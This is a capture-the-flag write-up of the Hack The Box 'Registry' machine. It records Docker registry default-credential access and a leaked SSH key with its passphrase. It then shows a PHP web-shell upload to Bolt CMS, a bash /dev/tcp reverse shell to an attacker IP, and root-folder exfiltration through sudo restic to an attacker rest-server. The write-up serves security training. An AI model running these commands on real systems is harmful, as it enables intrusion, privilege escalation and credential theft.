---
layout: single
title: Registry - Hack The Box
excerpt: "Registry is a hard difficulty linux machine, which features Docker and Bolt CMS running on Nginx. Docker registry API access is configured with default credentials, which allows us to pull the repository file. We gain intital foothold using the private key present in those repositories. User credentials for Bolt CMS can be obtained, and exploiting the CMS provides us with access to the www-data user, who has sudo entry to perform backups as root using the restic program. After taking a backup of the root folder remotely and mounting the repository with restic, with help of root priveate key we ssh as root."
date: 2020-04-04
classes: wide
header:
  teaser: /assets/images/htb-writeup-registry/registry_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - RCE
  - Docker Registry
  - Restic
  - CMS
---

![](/assets/images/htb-writeup-registry/registry_logo.png)

## Synopsis
Registry is a hard difficulty linux machine, which features Docker and Bolt CMS running on Nginx. Docker registry API access is configured with default credentials, which allows us to pull the repository file. We gain intital foothold using the private key present in those repositories. User credentials for Bolt CMS can be obtained, and exploiting the CMS provides us with access to the www-data user, who has sudo entry to perform backups as root using the restic program. After taking a backup of the root folder remotely and mounting the repository with restic, with help of root priveate key we ssh as root.

## Skills Required
* Enumeration
* Docker Registry
* Port Forwading

## Skills Learned
* RCE
* Restic Exploitation
* Bolt CMS
  
---
## Enumeration
### Nmap
```java
# Nmap 7.60 scan initiated Fri Mar 27 00:25:24 2020 as: nmap -sC -sV -v -p22,80,443 -o full.nmap registry.htb
Nmap scan report for registry.htb (10.10.10.159)
Host is up (0.32s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (EdDSA)
80/tcp  open  http     nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=docker.registry.htb
| Issuer: commonName=Registry
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-05-06T21:14:35
| Not valid after:  2029-05-03T21:14:35
| MD5:   0d6f 504f 1cb5 de50 2f4e 5f67 9db6 a3a9
|_SHA-1: 7da0 1245 1d62 d69b a87e 8667 083c 39a6 9eb2 b2b5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
The scan reveals that this is a Linux system which is running `nginx` web server and its version is `1.14.0`.
  
We notice that `ssl-cert` of port `443` using `commonName=docker.registry.htb` . So, i added `registry.htb` and `docker.registry.htb` to my `/etc/hosts` file. 

Looking at the port `80` and `443`. we see `nginx` default welcome page.

![](/assets/images/htb-writeup-registry/welcome.png)

Quikc `gobuster` on both `http` and `https` gives us the following dirs:
```
/install
/bolt
```
Running `gobuster` on `docker.registry.htb` gives `/v2` directory. So, browsing to `http://docker.registry.htb/v2/` prompt's us with HTTP Basic Authentication. 

![](/assets/images/htb-writeup-registry/welcome.png)

Let's try `admin:admin`. Luckily it worked and we're authenticated. Looking around we notice that it's a `Docker Registry` API endpoint.

![](/assets/images/htb-writeup-registry/api.png)

### Docker Registry
At this point we can read `Docker Registry` [API Specs](https://docs.docker.com/registry/spec/api/) to move furthur. Little bit googling helped me to find this awesome blog by `notsosecure` on [Anatomy of a hack: Docker Registry](https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/).

Docker Images are stored in collections, known as a repository. A `registry` instance may contain several repositories. The list of available repositories is made available through the `catalog`. catalog for a given registry can be retrieved using `_catalog` endpoint.

```
curl --user "admin:admin" http://docker.registry.htb/v2/_catalog | python -m json.tool

{
    "repositories": [
        "bolt-image"
    ]
}
```
It shows that the `registry` contains one `repository` named `bolt-image`. In context of Docker Registry, a `repository` is basically a collection of related images, typically providing different versions (or say, `tags`) of the same service or the application. we can fin out the `tags` listed for the repository using `/REPO_NAME/tags/list` endpoint.
```
curl --user "admin:admin" http://docker.registry.htb/v2/bolt-image/tags/list | python -m json.tool

{
    "name": "bolt-image",
    "tags": [
        "latest"
    ]
}
```
we indentified that there is one tag named `latest` and we can download `manifest` tag using `/manifests/latest` endpoint. A single `manifest` is information about an `image`, such as layer, size and digest. The `docker manifest` command also gives users additional information  such  as the os and architecture the `image` was built for.
```
curl --user "admin:admin" http://docker.registry.htb/v2/bolt-image/manifests/latest | python -m json.tool

{
    "architecture": "amd64",
    "fsLayers": [
        {
            "blobSum": "sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b"
        },
        {
            "blobSum": "sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee"
        },
        {
            "blobSum": "sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c"
        },
        {
            "blobSum": "sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7"
        },
        {
            "blobSum": "sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791"
        },
        {
            "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
        },
        {
            "blobSum": "sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0"
        },
        {
            "blobSum": "sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a"
        },
        {
            "blobSum": "sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797"
        },
        {
            "blobSum": "sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff"
        }
    ],
    "history": [
        {
            "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"e2e880122289\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"OpenStdin\":true,\"StdinOnce\":true,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"bash\"],\"Image\":\"docker.registry.htb/bolt-image\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":{}},\"container\":\"e2e88012228993b25b697ee37a0aae0cb0ecef7b1536d2b8e488a6ec3f353f14\",\"container_config\":{\"Hostname\":\"e2e880122289\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"OpenStdin\":true,\"StdinOnce\":true,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"bash\"],\"Image\":\"docker.registry.htb/bolt-image\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":{}},\"created\":\"2019-05-25T15:18:56.9530238Z\",\"docker_version\":\"18.09.2\",\"id\":\"f18c41121574af38e7d88d4f5d7ea9d064beaadd500d13d33e8c419d01aa5ed5\",\"os\":\"linux\",\"parent\":\"9380d9cebb5bc76f02081749a8e795faa5b5cb638bf5301a1854048ff6f8e67e\"}"
        },
        {
            "v1Compatibility": "{\"id\":\"9380d9cebb5bc76f02081749a8e795faa5b5cb638bf5301a1854048ff6f8e67e\",\"parent\":\"d931b2ca04fc8c77c7cbdce00f9a79b1954e3509af20561bbb8896916ddd1c34\",\"created\":\"2019-05-25T15:13:31.3975799Z\",\"container_config\":{\"Cmd\":[\"bash\"]}}"
        },
        {
            "v1Compatibility": "{\"id\":\"d931b2ca04fc8c77c7cbdce00f9a79b1954e3509af20561bbb8896916ddd1c34\",\"parent\":\"489e49942f587534c658da9060cbfc0cdb999865368926fab28ccc7a7575283a\",\"created\":\"2019-05-25T14:57:27.6745842Z\",\"container_config\":{\"Cmd\":[\"bash\"]}}"
        },
        {
            "v1Compatibility": "{\"id\":\"489e49942f587534c658da9060cbfc0cdb999865368926fab28ccc7a7575283a\",\"parent\":\"7f0ab92fdf7dd172ef58247894413e86cfc60564919912343c9b2e91cd788ae4\",\"created\":\"2019-05-25T14:47:52.6859489Z\",\"container_config\":{\"Cmd\":[\"bash\"]}}"
        },
        {
            "v1Compatibility": "{\"id\":\"7f0ab92fdf7dd172ef58247894413e86cfc60564919912343c9b2e91cd788ae4\",\"parent\":\"5f7e711dba574b5edd0824a9628f3b91bfd20565a5630bbd70f358f0fc4ebe95\",\"created\":\"2019-05-24T22:51:14.8744838Z\",\"container_config\":{\"Cmd\":[\"/bin/bash\"]}}"
        },
        {
            "v1Compatibility": "{\"id\":\"5f7e711dba574b5edd0824a9628f3b91bfd20565a5630bbd70f358f0fc4ebe95\",\"parent\":\"f75463b468b510b7850cd69053a002a6f10126be3764b570c5f80a7e5044974c\",\"created\":\"2019-04-26T22:21:05.100534088Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"/bin/bash\\\"]\"]},\"throwaway\":true}"
        },
        {
            "v1Compatibility": "{\"id\":\"f75463b468b510b7850cd69053a002a6f10126be3764b570c5f80a7e5044974c\",\"parent\":\"4b937c36cc17955293cc01d8c7c050c525d22764fa781f39e51afbd17e3e5529\",\"created\":\"2019-04-26T22:21:04.936777709Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c mkdir -p /run/systemd \\u0026\\u0026 echo 'docker' \\u003e /run/systemd/container\"]}}"
        },
        {
            "v1Compatibility": "{\"id\":\"4b937c36cc17955293cc01d8c7c050c525d22764fa781f39e51afbd17e3e5529\",\"parent\":\"ab4357bfcbef1a7eaa70cfaa618a0b4188cccafa53f18c1adeaa7d77f5e57939\",\"created\":\"2019-04-26T22:21:04.220422684Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c rm -rf /var/lib/apt/lists/*\"]}}"
        },
        {
            "v1Compatibility": "{\"id\":\"ab4357bfcbef1a7eaa70cfaa618a0b4188cccafa53f18c1adeaa7d77f5e57939\",\"parent\":\"f4a833e38a779e09219325dfef9e5063c291a325cad7141bcdb4798ed68c675c\",\"created\":\"2019-04-26T22:21:03.471632173Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c set -xe \\t\\t\\u0026\\u0026 echo '#!/bin/sh' \\u003e /usr/sbin/policy-rc.d \\t\\u0026\\u0026 echo 'exit 101' \\u003e\\u003e /usr/sbin/policy-rc.d \\t\\u0026\\u0026 chmod +x /usr/sbin/policy-rc.d \\t\\t\\u0026\\u0026 dpkg-divert --local --rename --add /sbin/initctl \\t\\u0026\\u0026 cp -a /usr/sbin/policy-rc.d /sbin/initctl \\t\\u0026\\u0026 sed -i 's/^exit.*/exit 0/' /sbin/initctl \\t\\t\\u0026\\u0026 echo 'force-unsafe-io' \\u003e /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \\t\\t\\u0026\\u0026 echo 'DPkg::Post-Invoke { \\\"rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\\\"; };' \\u003e /etc/apt/apt.conf.d/docker-clean \\t\\u0026\\u0026 echo 'APT::Update::Post-Invoke { \\\"rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\\\"; };' \\u003e\\u003e /etc/apt/apt.conf.d/docker-clean \\t\\u0026\\u0026 echo 'Dir::Cache::pkgcache \\\"\\\"; Dir::Cache::srcpkgcache \\\"\\\";' \\u003e\\u003e /etc/apt/apt.conf.d/docker-clean \\t\\t\\u0026\\u0026 echo 'Acquire::Languages \\\"none\\\";' \\u003e /etc/apt/apt.conf.d/docker-no-languages \\t\\t\\u0026\\u0026 echo 'Acquire::GzipIndexes \\\"true\\\"; Acquire::CompressionTypes::Order:: \\\"gz\\\";' \\u003e /etc/apt/apt.conf.d/docker-gzip-indexes \\t\\t\\u0026\\u0026 echo 'Apt::AutoRemove::SuggestsImportant \\\"false\\\";' \\u003e /etc/apt/apt.conf.d/docker-autoremove-suggests\"]}}"
        },
        {
            "v1Compatibility": "{\"id\":\"f4a833e38a779e09219325dfef9e5063c291a325cad7141bcdb4798ed68c675c\",\"created\":\"2019-04-26T22:21:02.724843678Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) ADD file:7ce84f13f11609a50ece7823578159412e2299c812746d1d1f1ed5db0728bd37 in / \"]}}"
        }
    ],
    "name": "bolt-image",
    "schemaVersion": 1,
    "signatures": [
        {
            "header": {
                "alg": "ES256",
                "jwk": {
                    "crv": "P-256",
                    "kid": "DU2P:4V3U:774B:45ZJ:IC22:53SM:2A3F:PJOT:77MM:BUXN:X2T5:K7AY",
                    "kty": "EC",
                    "x": "NvJQs2pZnJqdrJvqEOnGM5ES7svsdWE6jEhhn9Rl7v8",
                    "y": "yzayhDnsn34jusv6xKOHpxH2qzFD8cP-A7goTsozFlk"
                }
            },
            "protected": "eyJmb3JtYXRMZW5ndGgiOjY3OTIsImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyMC0wMy0yOFQxMjowMToyMVoifQ",
            "signature": "waunzuyj7oRlKnXPM22tv2UYidZH3E8-jzG84pub-EaG52oQwDGC7lSFzXByETwsgTyCsn8yYGh24BbXd7YuXg"
        }
    ],
    "tag": "latest"
}
```

`blobsum` is the digest of the referenced filesystem image layer. A digest must be `sha256` hash. Since, we got the list of `blobs`, form the above output. we can download each `blob` using `/v2/REPO_NAME/blobs/sha256*****` endpoint. This will download a `gzipped` file for each commit (or let's say, configurational changes in base image) one blob is assigned.

we can download through API like this `http://docker.registry.htb/v2/bolt-image/blobs/sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff` . Once we've downloaded all the blobs, we can `unzip` them and go through them. I wrote a small bash script onliner to recursive `unzip` them using `tar`.
```bash
for i in $(cat ls);do tar -zxvf $i;done
```
## User bolt
Enumerating through all the directoreis for sensitive info. under one image layer i found `passphrase: GkOcz221Ftb3ugog` at the following directory `etc/profile.d/01-ssh.sh`.
```bash
cat etc/profile.d/01-ssh.sh

#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect "Enter passphrase for /root/.ssh/id_rsa:"
send "GkOcz221Ftb3ugog\n";
expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
interact
```
Looking at the `.bash_hisotry` file under `/root/.bash_history` we found the user downloading `https://github.com/bolt/bolt` using Git. looking at it's `Github` we notice that is a `CMS` written in php. We'll have a look at this directory once we're inside the machine .
```bash
<SNIP>
apt install nginx
apt install php-fpm
cd /var/www/html/
ls -la
rm -rf index.html 
mv index.nginx-debian.html index.html
l
git clone https://github.com/bolt/bolt.git
l
ls -la
cd bolt/
ls -la
useradd -m bolt
<SNIP>
```

On Further more enumeration. Found `id_rsa` key for the `bolt` user at `root/.ssh/id_rsa.pub` directory.
```
cat root/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,1C98FA248505F287CCC597A59CF83AB9

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
Bdtfi9goJBFb6P7yHapZ13W30b96ZQG4Gdf4ZeV6MPMizcTbiggZRBokZLCBMb5H
pgkPgTrGJlbm+sLu/kt4jgex3T/NWwXHVrny5kIuTbbv1fXfyfkPqU66eysstO2s
OxciNk4W41o9YqHHYM9D/uL6xMqO3K/LTYUI+LcCK13pkjP7/zH+bqiClfNt0D2B
Xg6OWYK7E/DTqX+7zqNQp726sDAYKqQNpwgHldyDhOG3i8o66mLj3xODHQzBvwKR
bJ7jrLPW+AmQwo/V8ElNFPyP6oZBEdoNVn/plMDAi0ZzBHJc7hJ0JuHnMggWFXBM
PjxG/w4c8XV/Y2WavafEjT7hHuviSo6phoED5Zb3Iu+BU+qoEaNM/LntDwBXNEVu
Z0pIXd5Q2EloUZDXoeyMCqO/NkcIFkx+//BDddVTFmfw21v2Y8fZ2rivF/8CeXXZ
ot6kFb4G6gcxGpqSZKY7IHSp49I4kFsC7+tx7LU5/wqC9vZfuds/TM7Z+uECPOYI
f41H5YN+V14S5rU97re2w49vrBxM67K+x930niGVHnqk7t/T1jcErROrhMeT6go9
RLI9xScv6aJan6xHS+nWgxpPA7YNo2rknk/ZeUnWXSTLYyrC43dyPS4FvG8N0H1V
94Vcvj5Kmzv0FxwVu4epWNkLTZCJPBszTKiaEWWS+OLDh7lrcmm+GP54MsLBWVpr
-----END RSA PRIVATE KEY-----
```

Now we can login as `bolt` user with the help of th `private key` and the `passphrase` which we found in our enumeration. 
```bash
ssh -i bolt.id_rsa bolt@registry.htb

Enter passphrase for key 'bolt.id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

 System information disabled due to load higher than 1.0
Last login: Sat Mar 28 11:09:14 2020 from 10.10.14.93
bolt@bolt:~$ wc -c user.txt
33 user.txt
bolt@bolt:~$ whoami && cat user.txt
bolt
ytc0ytdmnzywnzgxngi0zte0otm3ywzi
```
### www-data 
Let's find for the directory where the `bolt CMS` is present. little bit of looking around we found it at `/var/www/html/bolt`. we'll start digging into the directory for sensitive info. 

we found a `database file` at `/var/www/html/bolt/app/database/bolt.db` which reveals the hash `$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK`.
```sql
 --> Found for interesting column names in bolt_users (output limit 10)
CREATE TABLE bolt_users (id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, username VARCHAR(32) NOT NULL, password VARCHAR(128) NOT NULL, email VARCHAR(254) NOT NULL, lastseen DATETIME DEFAULT NULL, lastip VARCHAR(45) DEFAULT NULL, displayna
me VARCHAR(32) NOT NULL, stack CLOB NOT NULL --(DC2Type:json)
, enabled BOOLEAN DEFAULT '1' NOT NULL, shadowpassword VARCHAR(128) DEFAULT NULL, shadowtoken VARCHAR(128) DEFAULT NULL, shadowvalidity DATETIME DEFAULT NULL, failedlogins INTEGER DEFAULT 0 NOT NULL, throttleduntil DATETIME DEFAULT NULL,
roles CLOB NOT NULL --(DC2Type:json)
)
1, admin, $2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK, bolt@registry.htb, 2020-03-28 09:34:53, 10.10.16.16, Admin, ["themes://php-one-liner.php","themes://rvsh.php","themes://revsh.php"], 1, None, None, None, 0, None, ["r
oot","everyone"]
```
Cracking that hash with `john` reveals the password for `admin` user of `bolt CMS` is `strawberry`. If we want to crackt the same `hash` which is already cracked by `john` .By deleting the `john.pot` file helps us.
```bash
echo '$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK' > bolt.hash
```
![](/assets/images/htb-writeup-registry/crack.png)

We Noticed `/blot` directory in our directory bruteforce . Browesing to it gives us the `bolt CMS` main page. Little googleing show we can find `bolt CMS` login page at `/bolt` directory. so we can find the login page on this machine at `/bolt/bolt`.

![](/assets/images/htb-writeup-registry/login.png)

So we can login to the `CMS` with credentials we previously found `admin:strawbery` . We can also see the `version` of CMS on the page which is `Bolt 3.6.4`.

![](/assets/images/htb-writeup-registry/cms-auth.png)

Quick googling about ` Bolt CMS Authenticated RCE` i came across this blog [CVE-2019-9185](https://www.hacksecproject.com/?p=293) which show that we can upload `php` files through `Settings > File Management > Upload Files` and access them to get `RCE`.
I also came to know that we can edit the `config.yml` at `Settings > Configuration > Main Configuration` and add `php` to the `accept_file_types` list in the `config.yml` and save it to directly upload `php` files.

![](/assets/images/htb-writeup-registry/config.png)

We can upload a basic php  shell `<?php system($_GET['cmd']); ?>` and can run `bash` commands to get our revershell like `bash -c 'bash -i >& /dev/tcp/10.10.14.226/9001 0>&1'`.

![](/assets/images/htb-writeup-registry/upload.png)

But i'm unable to get the reverse shell back and the request getting `timed out`.

![](/assets/images/htb-writeup-registry/timeout.png)

After little bit of debugging i realized that there is some `firewall` which is blocking and there some `IP` restrictions enable on this box. Since we cannot get reverse shell on to our attack machine. Since we've `bolt` user shell. we'll try to make `reverse` shell to `localhost` . 

![](/assets/images/htb-writeup-registry/www-data.png)

And it worked!. Now we're `www-data` and looking at `sudo` permissions. we notice that we can run `restic` as `sudo` with out password.
## Privilege Escalation
```bash
www-data@bolt:~/html/bolt/files$ sudo -l

Matching Defaults entries for www-data on bolt:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bolt:
    (root) NOPASSWD: /usr/bin/restic backup -r rest*
```
`Restic` is a backup program . we can install it on our local `apt-get install restic`. However in order to be able to transfer the snapshot we also need to set up rest server on our attack machine [restic/rest-server](https://github.com/restic/rest-server) 

Setting up `rest server` on our local and initiating repo with `restic init --repo backup/`.
```bash
rest-server --path backup/ 

rest-server 0.9.7 (40ba90f-dirty) compiled with go1.10.4 on linux/amd64
Data directory: backup/
Authentication disabled
Private repositories disabled
Starting server on :8000

```
Now, we need to do `port` forwarding first so we can be able to transfer the `snapshot`.

```bash
ssh -R 8000:127.0.0.1:8000 -i bolt.id_rsa bolt@registry.htb

Enter passphrase for key 'bolt.id_rsa':
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

  System information as of Sat Mar 28 17:26:56 UTC 2020

  System load:  0.02              Users logged in:                1
  Usage of /:   6.9% of 61.80GB   IP address for eth0:            10.10.10.159
  Memory usage: 43%               IP address for br-1bad9bd75d17: 172.18.0.1
  Swap usage:   3%                IP address for docker0:         172.17.0.1
  Processes:    172
Last login: Sat Mar 28 16:58:47 2020 from 10.10.14.226
bolt@bolt:~$ 
```
Next,ww transfer the backup of `root` folder to our machine.
```
www-data@bolt:~/html/bolt/files$ sudo restic backup -r rest:http://127.0.0.1:8000/ /root                                                                                                                                                      
< restic backup -r rest:http://127.0.0.1:8000/ /root      
enter password for repository:
password is correct
scan [/root]
scanned 2 directories, 2 files in 0:00
[0:00] 100.00%  222B / 222B  4 / 4 items  0 errors  ETA 0:00
duration: 0:00
snapshot 8b6515fd saved
```
And finally going through the snapshot i'm able to fina the `private` key for the root and `ssh` to access as `root`.
```
ssh -i root.id_rsa root@registry.htb

Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

  System information as of Sat Mar 28 18:07:57 UTC 2020

  System load:  0.0               Users logged in:                1
  Usage of /:   5.6% of 61.80GB   IP address for eth0:            10.10.10.159
  Memory usage: 21%               IP address for br-1bad9bd75d17: 172.18.0.1
  Swap usage:   0%                IP address for docker0:         172.17.0.1
  Processes:    156
Last login: Sat Mar 28 18:07:45 2020 from 10.10.14.40
root@bolt:~# whoami
root
root@bolt:~# cat root.txt
ntrkzgnkotaxyju0ntrinda4yzbkztgw
```
Thank you for taking your time for reading this blog!.